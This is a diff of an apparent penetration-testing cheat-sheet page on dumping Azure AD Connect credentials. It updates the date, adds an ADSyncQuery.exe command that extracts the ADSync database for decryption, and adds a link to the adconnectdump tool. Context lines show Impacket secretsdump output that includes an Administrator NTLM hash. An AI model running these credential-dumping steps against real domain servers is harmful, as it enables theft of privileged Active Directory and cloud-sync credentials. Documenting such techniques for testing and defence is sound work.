@@ -1,6 +1,6 @@
- ---
+---
 title: "Azure AD Connect"
-date: 2024-11-23
+date: 2025-02-21
 tags: ["Azure AD Connect", "Secretsdump", "ADSync", "Password", "Active Directory", "Windows"]
 ---
 
@@ -49,6 +49,10 @@ Azure AD Connect remote credential dumper - by @_dirkjan
 
 ```console
 # Copy both ADSync.mdf and ADSync_log.LDF to WindowsVM
+.\ADSyncQuery.exe C:\adconnectdump\ADSyncDecrypt\ADSyncQuery\bin\Release\ADSync.mdf > out.txt
+```
+
+```console {class="sample-code"}
 PS C:\adconnectdump\ADSyncDecrypt\ADSyncQuery\bin\Release> .\ADSyncQuery.exe C:\adconnectdump\ADSyncDecrypt\ADSyncQuery\bin\Release\ADSync.mdf > out.txt
 ```
 
@@ -106,5 +110,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca509:::
 ...[SNIP]...
 ```
+
+<small>*Ref: [adconnectdump](https://github.com/dirkjanm/adconnectdump/tree/master)*</small>
 
 {{< /tabcontent >}}
